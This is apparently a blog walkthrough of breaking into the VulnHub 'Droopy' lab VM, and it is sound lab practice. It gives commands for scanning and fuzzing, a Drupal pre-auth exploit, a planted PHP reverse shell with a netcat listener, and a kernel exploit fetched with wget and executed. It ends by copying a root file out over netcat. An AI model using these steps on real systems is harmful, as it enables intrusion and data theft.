I"ì<p>Been a while since i played with vulnhub. So since yesterday i've been trying to break <a href="https://www.vulnhub.com/entry/droopy-v02,143/">droopy</a>, which i almost did ...
<p>So, the usual stuff:

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>netdiscover <span class="nt">-r</span> 192.168.0.0/16</code></pre></figure>

<p> My target is 192.168.1.89 .

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-p-</span> <span class="nt">-sV</span> 192.168.1.89</code></pre></figure>

<p> Found a port 80 open. I followed it since it was the only one open and found a drupal website.
<br />I tried to create a user no luck, i searched for something interesting in the sub-directories:

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python wfuzz.py <span class="nt">-c</span> <span class="nt">-z</span> file,wordlist/general/common.txt <span class="nt">--hc</span> 404   http://192.168.1.89/FUZZ</code></pre></figure>

</pre>
<p>... after a while decide to change and look for the drupal stuff. I found this gem <a href="https://github.com/droope/droopescan">droopescan</a> and found drupal 7.3 was in usage.

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./droopescan  scan drupal <span class="nt">-u</span> http://192.168.1.88/ <span class="nt">-t</span> 8</code></pre></figure>

<p>I don't usually ( at least i don't remember) hunt for exploits but his time this seemed a reasonable choice since it was an old version of drupal and i had no other ideia.
<p>Found the exploit ... a pre-authentication one, wow. o.o !!
<a href="https://www.exploit-db.com/exploits/34992/">the exploit</a>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python 34992.py  <span class="nt">-t</span> http://192.168.1.88 <span class="nt">-u</span> estafermo <span class="nt">-p</span> estafermo</code></pre></figure>

<p>User created.

<p> So, in the admin panel after a while trying to add a "file uploader" to the article i saw an item saying to enable PHP to run. I wonder if this is commom usage in other CMS and similar, like wordpress and stuff... must check this.
<br />In modules I set the PHP to ok and then set the possibility to add php code in 'articles'. Next, i created a new article and used this <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php reverse shell</a> pointing to my computer. With the usual suspect netcat for the win:

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lnvvp</span> 12344</code></pre></figure>

I created an article with that PHP in the body!
<p><b>shell!</b>

<p>After fooling around in the server, moving around all directories i could remember,there was no commom user directories to see .bash_history and not much besides the mysql password with no further info in the database as well.
I knew it was an old kernel, it's probably the first command i do whenever i connect to a server:

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">uname</span> <span class="nt">-a</span></code></pre></figure>

Old old kernel... then again, i had no clue what to do next so i choose the easy path:

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /tmp
wget https://www.kernel-exploits.com/media/ofs_64
<span class="nb">chmod</span> +x ofs_64
./ofs_64</code></pre></figure>

<p><b>ROOT!</b> Oh!
<p>Reading the email in /var/spool/mail/www-data and the help hints i knew i had to use rockyou passwordlist against something and found the encrypted file in:

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/root/dave.tc</code></pre></figure>

<p>So copied the file with netcat to my computer:

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lnvvp</span> 12345 <span class="o">&gt;</span> dave.tc
nc 192.168.1.73 12345 &lt; dave.tc</code></pre></figure>

<p>Well, then i gave up... i started cracking it with hashcat and went to do something else ... when i got back after 2 hours... no luck... wtf... i must have done something wrong.
<p>I thought i did something wrong.. 2 exploits in one VM and still no flag?  Hm... so i went to check other people resolutions: it appears they filtered the rockyou by the word 'academy' ( from the email in /var/spool/mail/www-data)... <b>i would never do that, honestly.</b> I still fail to see that hint in the email :P . So then they mount the truecrypt and found the flag in an hidden folder.
<p>Fun until root! :) After that i started wondering if what i was doing was ok, mainly those 2 exploits usage.
